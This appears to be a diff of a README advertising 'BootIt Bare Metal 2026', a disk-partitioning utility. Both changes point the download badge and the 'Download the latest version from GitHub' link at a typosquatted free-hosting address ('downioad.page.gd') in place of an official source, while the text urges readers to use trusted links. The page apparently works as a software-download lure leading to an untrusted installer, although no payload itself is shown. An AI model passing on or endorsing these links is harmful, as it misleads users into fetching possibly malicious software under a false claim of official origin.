@@ -2,7 +2,7 @@
 
 BootIt Bare Metal is a powerful disk partitioning and system management utility designed for Windows desktop environments. The 2026 version delivers enhanced features for boot menu customization, efficient disk operations, and reliable system recovery, making it an essential tool for both casual users and IT professionals.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -67,7 +67,7 @@ A5: BootIt Bare Metal offers a feature-limited trial version for evaluation purp
 
 To get started with BootIt Bare Metal 2026, download the installer from the official source. Ensure you always use trusted download links to maintain system security and avoid unauthorized versions.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## License and Copyright
 
